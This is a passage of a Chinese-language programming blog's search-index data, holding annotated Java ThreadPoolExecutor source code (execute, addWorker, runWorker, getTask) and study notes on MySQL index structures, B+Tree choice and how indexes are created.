class=\"line\">    <span class=\"keyword\">if</span> (workerCountOf(c) &lt; corePoolSize) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//直接将通过addWorker添加新核心线程同时作为第一个任务</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (addWorker(command, <span class=\"keyword\">true</span>))</span><br><span class=\"line\">     \t\t<span class=\"comment\">//添加成功返回</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        <span class=\"comment\">//添加失败了可能:1.shudown2.shutdownNow3.创建线程失败.....</span></span><br><span class=\"line\">        <span class=\"comment\">//重新再次获取ctl关键原子变量</span></span><br><span class=\"line\">        c = ctl.get();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//判断线程池是否在运行并将该任务添加到阻塞队列</span></span><br><span class=\"line\">    <span class=\"comment\">//offer为阻塞队列的非阻塞操作,如果添加失败了就返回false,&amp;&amp;有短路作用,如果线程池关闭了就不会运行后面的判断</span></span><br><span class=\"line\">    <span class=\"comment\">//到这里只有两种情况:</span></span><br><span class=\"line\">    <span class=\"comment\">//1.线程池关闭了</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isRunning(c) &amp;&amp; workQueue.offer(command)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//再次获取关键原子变量用于双端检测</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> recheck = ctl.get();</span><br><span class=\"line\">        <span class=\"comment\">//双端检测</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (! isRunning(recheck) &amp;&amp; remove(command))</span><br><span class=\"line\">            <span class=\"comment\">//线程池关了,移除任务</span></span><br><span class=\"line\">            reject(command);</span><br><span class=\"line\">        <span class=\"comment\">//线程池中线程数为0</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (workerCountOf(recheck) == <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"comment\">//添加空任务使线程池继续执行阻塞队列的任务,因为核心线程可能都休眠了或者由于核心\t\t \t //线程数设为0</span></span><br><span class=\"line\">            addWorker(<span class=\"keyword\">null</span>, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//加入阻塞队列也失败了或者shutdown了则尝试以添加非核心线程去处理这个任务</span></span><br><span class=\"line\">    <span class=\"comment\">// 这里面的失败的条件，一般是执行下面addWorker(command, false)的时候，</span></span><br><span class=\"line\">    <span class=\"comment\">// 另外一个线程执行了线程池的shutDown()操作，这种情况基本不会出现，</span></span><br><span class=\"line\">    <span class=\"comment\">//因为线程池的操作如extcute或shutDown一般都是主线程中的，</span></span><br><span class=\"line\">    <span class=\"comment\">// 所以 addWorker和shutdown都是顺序执行的，不会出现失败的情况。</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (!addWorker(command, <span class=\"keyword\">false</span>))</span><br><span class=\"line\">        <span class=\"comment\">//又失败了拒绝了该任务(不当舔狗!!!)</span></span><br><span class=\"line\">        reject(command);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键方法addWorker\"><a href=\"#关键方法addWorker\" class=\"headerlink\" title=\"关键方法addWorker\"></a>关键方法addWorker</h3><blockquote>\n<p>自旋添加线程数,建worker上锁添加worker,启动线程开始工作</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">boolean</span> <span class=\"title\">addWorker</span><span class=\"params\">(Runnable firstTask, <span class=\"keyword\">boolean</span> core)</span> </span>&#123;</span><br><span class=\"line\">    \t<span class=\"comment\">//设置循环名称</span></span><br><span class=\"line\">        retry:</span><br><span class=\"line\">    \t<span class=\"comment\">//死循环下面肯定带if</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取线程池状态</span></span><br><span class=\"line\">            <span class=\"keyword\">int</span> c = ctl.get();</span><br><span class=\"line\">            <span class=\"keyword\">int</span> rs = runStateOf(c);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//如果线程池的状态大于SHUTDOWN,STOP或者TERMINATED返回false</span></span><br><span class=\"line\">            <span class=\"comment\">//除非线程为SHUTDOWN且任务为空且等待队列为非空,说明刚关机等待队列还有任务</span></span><br><span class=\"line\">            <span class=\"comment\">//需要赶紧处理</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (rs &gt;= SHUTDOWN &amp;&amp;</span><br><span class=\"line\">                ! (rs == SHUTDOWN &amp;&amp;</span><br><span class=\"line\">                   firstTask == <span class=\"keyword\">null</span> &amp;&amp;</span><br><span class=\"line\">                   ! workQueue.isEmpty()))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//循环通过CAS设置线程池的线程数量让其加1</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//因为这个ctl变量是volatile保证了可见性因此不需要上锁</span></span><br><span class=\"line\">                <span class=\"keyword\">int</span> wc = workerCountOf(c);</span><br><span class=\"line\">                <span class=\"comment\">//如果要添加核心线程则判断是否大于核心线程,否则跟最大线程比较</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (wc &gt;= CAPACITY ||</span><br><span class=\"line\">                    wc &gt;= (core ? corePoolSize : maximumPoolSize))</span><br><span class=\"line\">                    <span class=\"comment\">//超过了返回false添加失败</span></span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">                <span class=\"comment\">//CAS设置线程数</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (compareAndIncrementWorkerCount(c))</span><br><span class=\"line\">                    <span class=\"comment\">//成功率跳出循环下面添加工作线程</span></span><br><span class=\"line\">                    <span class=\"keyword\">break</span> retry;</span><br><span class=\"line\">                c = ctl.get();  <span class=\"comment\">// Re-read ctl</span></span><br><span class=\"line\">                <span class=\"comment\">//线程池状态发生变化需要退出重新进入循环</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (runStateOf(c) != rs)</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span> retry;</span><br><span class=\"line\">                <span class=\"comment\">// else CAS failed due to workerCount change; retry inner loop</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">//线程是否开启</span></span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> workerStarted = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    \t<span class=\"comment\">//线程是否添加</span></span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> workerAdded = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    \t<span class=\"comment\">//工作类是ThreadPoolExecutor的内部类,保存了线程Thread以及任务Runnable</span></span><br><span class=\"line\">        Worker w = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//构造方法设置任务,通过工厂建线程设置state</span></span><br><span class=\"line\">            w = <span class=\"keyword\">new</span> Worker(firstTask);</span><br><span class=\"line\">            <span class=\"keyword\">final</span> Thread t = w.thread;</span><br><span class=\"line\">            <span class=\"comment\">//如果创建失败下面就会返回false</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (t != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//上锁保证Hashset安全</span></span><br><span class=\"line\">                <span class=\"keyword\">final</span> ReentrantLock mainLock = <span class=\"keyword\">this</span>.mainLock;</span><br><span class=\"line\">                mainLock.lock();</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                   \t<span class=\"comment\">//获取线程池状态</span></span><br><span class=\"line\">                    <span class=\"keyword\">int</span> rs = runStateOf(ctl.get());</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\">//再次判断</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (rs &lt; SHUTDOWN ||</span><br><span class=\"line\">                        (rs == SHUTDOWN &amp;&amp; firstTask == <span class=\"keyword\">null</span>)) &#123;</span><br><span class=\"line\">                        <span class=\"comment\">//如果是活的说明无法启动了</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (t.isAlive()) <span class=\"comment\">// precheck that t is startable</span></span><br><span class=\"line\">                            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalThreadStateException();</span><br><span class=\"line\">                        <span class=\"comment\">//一个HashSet用来保存worker</span></span><br><span class=\"line\">                        workers.add(w);</span><br><span class=\"line\">                        <span class=\"keyword\">int</span> s = workers.size();</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (s &gt; largestPoolSize)</span><br><span class=\"line\">                            largestPoolSize = s;</span><br><span class=\"line\">                        <span class=\"comment\">//设置标记添加worker成功</span></span><br><span class=\"line\">                        workerAdded = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    mainLock.unlock();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"comment\">//如果添加worker是成功的</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (workerAdded) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//干活了</span></span><br><span class=\"line\">                    t.start();</span><br><span class=\"line\">                    <span class=\"comment\">//标记启动成功</span></span><br><span class=\"line\">                    workerStarted = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//失败处理机制</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (! workerStarted)</span><br><span class=\"line\">                addWorkerFailed(w);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> workerStarted;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"关键方法runWorker\"><a href=\"#关键方法runWorker\" class=\"headerlink\" title=\"关键方法runWorker\"></a>关键方法runWorker</h3><p>真正运行的方法：线程复用的逻辑</p>\n<blockquote>\n<p>​    循环取任务,有则执行否则退出</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//只有worker对象调用这个方法,worker对象的run方法把自身当做参数调用该方法</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title\">runWorker</span><span class=\"params\">(Worker w)</span> </span>&#123;</span><br><span class=\"line\">    \t<span class=\"comment\">//因为是新创建的线程启动的,铜鼓这个方法获得线程,其实也就是w.thread</span></span><br><span class=\"line\">        Thread wt = Thread.currentThread();</span><br><span class=\"line\">    \t<span class=\"comment\">//把任务拿出来就置空用来放下一个要处理的任务,循环利用</span></span><br><span class=\"line\">        Runnable task = w.firstTask;</span><br><span class=\"line\">        w.firstTask = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        w.unlock(); <span class=\"comment\">// allow interrupts</span></span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> completedAbruptly = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//无限循环,当当前任务不为空时或者通过getTask拿任务不为空时</span></span><br><span class=\"line\">            <span class=\"comment\">//这里就是线程复用的核心，比方说当这个程执行完当前任务后，就去队列中取任务来执\t\t\t//行，这就完成了线程的复用</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span> (task != <span class=\"keyword\">null</span> || (task = getTask()) != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                w.lock();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ((runStateAtLeast(ctl.get(), STOP) ||</span><br><span class=\"line\">                     (Thread.interrupted() &amp;&amp;</span><br><span class=\"line\">                      runStateAtLeast(ctl.get(), STOP))) &amp;&amp;</span><br><span class=\"line\">                    !wt.isInterrupted())</span><br><span class=\"line\">                    wt.interrupt();</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//hook 前置处理</span></span><br><span class=\"line\">                    beforeExecute(wt, task);</span><br><span class=\"line\">                    Throwable thrown = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        <span class=\"comment\">//执行任务</span></span><br><span class=\"line\">                        task.run();</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (RuntimeException x) &#123;</span><br><span class=\"line\">                        thrown = x; <span class=\"keyword\">throw</span> x;</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (Error x) &#123;</span><br><span class=\"line\">                        thrown = x; <span class=\"keyword\">throw</span> x;</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (Throwable x) &#123;</span><br><span class=\"line\">                        thrown = x; <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Error(x);</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                        <span class=\"comment\">//hook 后置处理</span></span><br><span class=\"line\">                        afterExecute(task, thrown);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//置空避免重复执行</span></span><br><span class=\"line\">                    task = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                    w.completedTasks++;</span><br><span class=\"line\">                    w.unlock();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            completedAbruptly = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            processWorkerExit(w, completedAbruptly);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"内部类Worker\"><a href=\"#内部类Worker\" class=\"headerlink\" title=\"内部类Worker\"></a>内部类Worker</h3><p>实现了Runnable接口继承了AQS</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//构造方法,接收任务参数设置任务,创建线程,设置state </span></span><br><span class=\"line\">Worker(Runnable firstTask) &#123;</span><br><span class=\"line\">     setState(-<span class=\"number\">1</span>); <span class=\"comment\">// inhibit interrupts until runWorker</span></span><br><span class=\"line\">     <span class=\"keyword\">this</span>.firstTask = firstTask;</span><br><span class=\"line\">     <span class=\"comment\">//创建新线程并把任务设置为自己对象</span></span><br><span class=\"line\">     <span class=\"keyword\">this</span>.thread = getThreadFactory().newThread(<span class=\"keyword\">this</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * 首先addWorker方法创建Worker,worker创建新线程并把任务设置为自己对象</span></span><br><span class=\"line\"><span class=\"comment\"> * 创建完成worker后启动worker的thread。启动thread会自动调用run方法</span></span><br><span class=\"line\"><span class=\"comment\"> * run方法中把再次调用runWorker方法并把自身当做参数传入</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    runWorker(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"关键方法getTask\"><a href=\"#关键方法getTask\" class=\"headerlink\" title=\"关键方法getTask\"></a>关键方法getTask</h3><p>线程复用逻辑</p>\n<blockquote>\n<p> getTask方法 就是从阻塞队列中获取待执行的任务，按照先进先出的原则取任务。</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> Runnable <span class=\"title\">getTask</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    \t<span class=\"comment\">//等待一段时间后还没有任务就不要了非核心线程需要休眠</span></span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> timedOut = <span class=\"keyword\">false</span>; <span class=\"comment\">// Did the last poll() time out?</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//无限循环</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取运行状态</span></span><br><span class=\"line\">            <span class=\"keyword\">int</span> c = ctl.get();</span><br><span class=\"line\">            <span class=\"keyword\">int</span> rs = runStateOf(c);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// 获取线程池状态判断任务队列是否为空</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (rs &gt;= SHUTDOWN &amp;&amp; (rs &gt;= STOP || workQueue.isEmpty())) &#123;</span><br><span class=\"line\">                decrementWorkerCount();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//获取线程数</span></span><br><span class=\"line\">            <span class=\"keyword\">int</span> wc = workerCountOf(c);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//1.如果核心线程能被回收结果为true </span></span><br><span class=\"line\">            <span class=\"comment\">//2.如果当前线程数大于核心线程数</span></span><br><span class=\"line\">            <span class=\"comment\">//timed如果为true表示当前线程超时会被回收</span></span><br><span class=\"line\">            <span class=\"keyword\">boolean</span> timed = allowCoreThreadTimeOut || wc &gt; corePoolSize;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// 任务已经取完了了返回空</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((wc &gt; maximumPoolSize || (timed &amp;&amp; timedOut))</span><br><span class=\"line\">                &amp;&amp; (wc &gt; <span class=\"number\">1</span> || workQueue.isEmpty())) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (compareAndDecrementWorkerCount(c))</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//timed如果为true,那么等待超时会取消,如果为false那么表示该线程为核心</span></span><br><span class=\"line\">            <span class=\"comment\">//线程并且不用回收通过阻塞队列的阻塞方法take(),一直等待直到有元素为止</span></span><br><span class=\"line\">            <span class=\"comment\">//poll底层调用了condition的awaitNanos方法</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                Runnable r = timed ?</span><br><span class=\"line\">                    workQueue.poll(keepAliveTime, TimeUnit.NANOSECONDS) :</span><br><span class=\"line\">                    workQueue.take();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (r != <span class=\"keyword\">null</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">                <span class=\"comment\">//为空说明超时了</span></span><br><span class=\"line\">                timedOut = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException retry) &#123;</span><br><span class=\"line\">                timedOut = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>整体调用链:</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20221004104258706.png\" alt=\"image-20221004104258706\"></p>\n<p><strong>线程复用的逻辑:</strong></p>\n<p>通过submit提交任务后,如果当前线程数小于核心线程数,那么会通过addWorker添加一个worker,如果大于核心线程数则添加队列,队列满了才启动非核心线程处理.worker包装了当前任务以及线程，然后将线程启动,该线程完成当前任务后会一直从任务队列中取任务，如果当前线程是核心线程且设置核心线程不可回收,则该线程阻塞在队列的take方法,如果不是核心线程或者核心线程能被回收,那么从队列等待keepAliveTime 后poll方法返回空那么该线程变为死亡状态。其中poll方法通过condition的awaitNanos实现</p>\n","categories":["java"],"tags":["hexo"]},{"title":"MySQL索引原理","url":"/p/65044/","content":"<h1 id=\"MySQL索引\"><a href=\"#MySQL索引\" class=\"headerlink\" title=\"MySQL索引\"></a>MySQL索引</h1><h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><figure class=\"highlight markdown\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\"># 1.什么是索引 index</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> 官方定义：一种帮助mysq1提高查询效率的数据结构。典型的时间换空间</span><br><span class=\"line\"><span class=\"bullet\">-</span> 索引数据结构</span><br><span class=\"line\"><span class=\"bullet\">-</span> 索引的优点：</span><br><span class=\"line\"><span class=\"code\">\t1、大大加快数据查询速度</span></span><br><span class=\"line\"><span class=\"code\">- 索引的缺点：</span></span><br><span class=\"line\"><span class=\"code\">\t1、维护索引需要耗费数据库资源</span></span><br><span class=\"line\"><span class=\"code\">\t2、索引需要占用磁盘空间</span></span><br><span class=\"line\"><span class=\"code\">\t3、当对表的数据进行增删改的时候，因为要维护索引，速度会受到影响</span></span><br><span class=\"line\"><span class=\"code\"># 2.索引分类</span></span><br><span class=\"line\"><span class=\"code\">- a.主键索引</span></span><br><span class=\"line\"><span class=\"code\">\t设定为主键后数据库会自动建立索引，innodb为聚簇索引，主键索引列值不能为空</span></span><br><span class=\"line\"><span class=\"code\">- b.单值索引(普通索引)</span></span><br><span class=\"line\"><span class=\"code\">\t即一个索引只包含单个列，一个表可以有多个单列索引</span></span><br><span class=\"line\"><span class=\"code\">- c.唯一索引</span></span><br><span class=\"line\"><span class=\"code\">\t索引列的值必须唯一，但允许有空值(也是与主键索引的唯一区别)</span></span><br><span class=\"line\"><span class=\"code\">- d.复合索引</span></span><br><span class=\"line\"><span class=\"code\">\t即一个索引包含多个列</span></span><br><span class=\"line\"><span class=\"code\">-e.Full Text 全文索引（My5.7版本之前 只能用于MYISAM引擎）</span></span><br><span class=\"line\"><span class=\"code\">全文索引类型为FULLTEXT,在定义索引的列上支持值的全文查找，允许在这些索引列中插入重复值和空值。全文索引可以在CHAR、VARCHAR、TEXT类型列上创建。MYSQL只有MYISAM存储引擎支持全文索引</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"数据结构的选择\"><a href=\"#数据结构的选择\" class=\"headerlink\" title=\"数据结构的选择\"></a>数据结构的选择</h2><p>核心竞争条件:降低磁盘IO的次数</p>\n<h3 id=\"Hash表\"><a href=\"#Hash表\" class=\"headerlink\" title=\"Hash表\"></a>Hash表</h3><ul>\n<li>不支持范围查询,模糊查询,无法建立多列索引，范围查询时间复杂度会退化 O(n);</li>\n<li>mysql 5.5之后 默认使用的InnoDB引擎 ，而InnoDB 不支持哈希！</li>\n</ul>\n<h3 id=\"跳表\"><a href=\"#跳表\" class=\"headerlink\" title=\"跳表\"></a>跳表</h3><ul>\n<li>2kw的数据量需要2的24次方也就是24层，而且数据时放在不同的数据页的最多需要24次磁盘IO，比B+树多。而在redis中数据都是放在内存中，不存在磁盘IO问题。因此Redis的ZSet使用跳表做底层数据结构</li>\n</ul>\n<h3 id=\"二叉树\"><a href=\"#二叉树\" class=\"headerlink\" title=\"二叉树\"></a>二叉树</h3><ul>\n<li>当索引列的大小是自增时，二叉树会退化成链表。这样相当于全表扫描，磁盘IO次数较多，原因是二叉查找树变得不平衡了，因此我们可以进一步将二叉搜索树优化为平衡二叉树(红黑树)，即要求每个节点的左右子树的高度差不能超过 1。</li>\n</ul>\n<h3 id=\"红黑树\"><a href=\"#红黑树\" class=\"headerlink\" title=\"红黑树\"></a>红黑树</h3><ul>\n<li><p>当数据量较大时,树的深度较大，所需IO也较多</p>\n</li>\n<li><p>为了保证这棵树是一颗平衡树，在进行数据插入的时候，需要进行N多次的左旋和右旋操作，因此插入的性能比较低，但是查询的时候性能比较高，损失了插入性能满足了查询性能；</p>\n</li>\n</ul>\n<p>红黑树与AVL树的区别：红黑树是AVL树的一个变种，它也是在二叉查找树的基础上添加平衡条件，只是它对平衡条件的描述不像AVl树那样直接，而是转化成对节点颜色规则的描述。</p>\n<p>颜色规则： </p>\n<ol>\n<li>对于任意节点，要么是红色，要么是黑色；</li>\n<li>根节点是黑色的；</li>\n<li>如果一个节点是红色的，那么它的子节点必须是黑色的（即不能有两个连续的红色节点）；</li>\n<li>任意节点到其下面各个空结点（后面称为nil节点，并约定其颜色为黑色）的路径上都包含相同数目的黑色节点（称为黑高）</li>\n</ol>\n<p>通过对任何一条从根到空节点的路径上各个结点的颜色进行约束，红黑树可以确保没有一条路径会比其他路径长出2倍，因而红黑树是近似平衡的。</p>\n<h3 id=\"B-Tree\"><a href=\"#B-Tree\" class=\"headerlink\" title=\"B-Tree\"></a>B-Tree</h3><ul>\n<li>非叶子节点存放数据导致页存储数据量减少，使得树的高度增加，IO次数变多</li>\n<li>效率不稳定，越靠近根部元素查询越快</li>\n</ul>\n<h3 id=\"B-Tree-1\"><a href=\"#B-Tree-1\" class=\"headerlink\" title=\"B+Tree\"></a>B+Tree</h3><ul>\n<li>效率稳定</li>\n<li>B+树的叶子节点包含所有关键字，并以有序的链表结构存储，这样可很好提高增删效率，基于范围查询更好。</li>\n</ul>\n<p>插入数据时可能会页分裂，同时需要维护各个索引页</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>索引的选择无非是哈希，跳表，树。哈希在范围查询性能达到了O(N)较低，跳表的层数较高IO次数过多。树分为二叉搜索树,二叉平衡树,B-Tree,B+Tree,MySQL在读取数据时以页为逻辑单位,默认是16KB,而二叉搜索树与二叉平衡树每个节点只能存储一条数据，每次加载需要一层层加载浪费资源。因此需要一页存放多条数据，而B-Tree与B+Tree一个节点可以存储多条数据，使得MySQL可以一次加载多条数据放到内存比对。但是B-Tree的非叶子结点页存储了数据体积较大，一次加载而言，B+Tree能够加载更多数据。使得树的高度较高IO次数也多，因此选择B+Tree做索引</p>\n<h3 id=\"慢查询优化\"><a href=\"#慢查询优化\" class=\"headerlink\" title=\"慢查询优化\"></a>慢查询优化</h3><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220913144742009.png\" alt=\"image-20220913144742009\"></p>\n<h2 id=\"如何创建\"><a href=\"#如何创建\" class=\"headerlink\" title=\"如何创建\"></a>如何创建</h2><blockquote>\n<p>可以通过<code>show index from table_name</code>查看索引</p>\n</blockquote>\n<p>主键索引:创建表时自动生成</p>\n<p>单值索引：</p>\n<ul>\n<li>建表时:在建表语句的最后添加<code>key(column_name)</code></li>\n<li>建表后:<code>create index indexname on table_name(column_name)</code></li>\n</ul>\n<p>唯一索引：</p>\n<ul>\n<li>建表时:在建表语句最后添加<code>unique(column_name)</code></li>\n<li>建表后:<code>create unique indexname on table_name(column_name)</code></li>\n</ul>\n<p>复合索引：</p>\n<ul>\n<li>建表时:在建表语句最后添加<code>unique(column_name1,column_name2...)</code></li>\n<li>建表后:<code>create index indexname on table_name(column_name1,column_name2...)</code></li>\n</ul>\n<h2 id=\"联合索引-覆盖索引-的面试点\"><a href=\"#联合索引-覆盖索引-的面试点\" class=\"headerlink\" title=\"联合索引(覆盖索引)的面试点\"></a>联合索引(覆盖索引)的面试点</h2><p>假设有name,age,bir 3个字段，并且在name与age上建立了复合索引，那么以下情况能否利用索引</p>\n<blockquote>\n<p>name bir age     可以</p>\n<p>name age bir     可以</p>\n<p>age bir          不可以</p>\n<p>bir age name     可以</p>\n<p>name bir         name用到，bir没用到</p>\n</blockquote>\n<p>两条原则：</p>\n<ul>\n<li>最左前缀原则</li>\n<li>mysql引擎为了更好地利用索引，在查询过程中会动态调整查询到字段顺序以便利用索引</li>\n</ul>\n<h2 id=\"底层数据结构\"><a href=\"#底层数据结构\" class=\"headerlink\" title=\"底层数据结构\"></a>底层数据结构</h2><p>B+树，一般企业开发3层封顶，3层已经可以存上亿条数据</p>\n<p>假设一条数据有一个varchar(20),2个int那么</p>\n<p>每个节点默认存储16kB</p>\n<p>可以存储<code>1024*16*1024*16*1024*16/(4+4+8+20)</code>int为4个字节，varchar为20个字节，8为指针大小</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220613194102518.png\" alt=\"image-20220613194102518\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220613195210611.png\" alt=\"image-20220613195210611\"></p>\n<p>mysql索引面试相关</p>\n<ul>\n<li>数据存入mysql时会根据数据去排序，然后通过一个个指针将数据连接起来(因此不用uuid作主键，过于离散，无法排序)</li>\n<li>B+ 树中各个页之间是通过双向链表连接的,叶子节点中的数据是通过双向链表连接的”</li>\n<li>然后在链表的基础上构建B+树的数据结构，把多个数据放到一页页中，每一页默认是16kB</li>\n<li>3层的数据结构存储将近8亿，所以一般项目2层已经能存很多数据了</li>\n<li>同时mysql会将最顶层的目录常驻内存，减少io次数</li>\n<li>两层的数据最多1次io，根目录常驻内存</li>\n</ul>\n<h3 id=\"聚簇索引与非聚簇索引\"><a href=\"#聚簇索引与非聚簇索引\" class=\"headerlink\" 